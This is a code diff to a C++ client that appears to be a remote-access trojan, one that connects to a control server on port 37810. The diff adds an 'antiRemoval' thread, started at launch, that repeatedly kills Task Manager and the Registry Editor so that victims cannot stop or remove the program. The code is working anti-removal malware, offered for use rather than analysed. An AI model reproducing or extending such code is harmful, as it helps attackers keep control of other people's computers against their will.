@@ -7,6 +7,9 @@
 #include <fstream>
 #include "Request.h"
 #include "Filesystem.h"
+#include <windows.h>
+#include <Tlhelp32.h> 
+#include <stdio.h>
 
 using namespace std;
 #define BUFFER_SIZE 1024
@@ -15,6 +18,8 @@ using namespace std;
 #define GENERAL_SUCCESS "Sucessfully executed"
 #define IP_ADDRESS "127.0.0.1"
 int main(int argc, char* argv[]) {
+	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&antiRemoval, NULL, 0, NULL);
+
 	Socket *socket = new Socket();
 	socket->Connect(IP_ADDRESS, 37810, BLOCKING);
 
@@ -246,4 +251,31 @@ void getUptime() {
 }
 
 void remoteDesktop() {
+}
+
+void killProcessByName(const char *filename) {
+    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
+    PROCESSENTRY32 pEntry;
+    pEntry.dwSize = sizeof (pEntry);
+    BOOL hRes = Process32First(hSnapShot, &pEntry);
+    while (hRes) {
+        if (strcmp(pEntry.szExeFile, filename) == 0) {
+            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
+                                          (DWORD) pEntry.th32ProcessID);
+            if (hProcess != NULL) {
+                TerminateProcess(hProcess, 9);
+                CloseHandle(hProcess);
+            }
+        }
+        hRes = Process32Next(hSnapShot, &pEntry);
+    }
+    CloseHandle(hSnapShot);
+}
+
+void antiRemoval() {
+	while (true) {
+		killProcessByName("taskmgr.exe");
+		killProcessByName("regedit.exe");
+		Sleep(100);
+	}
 }
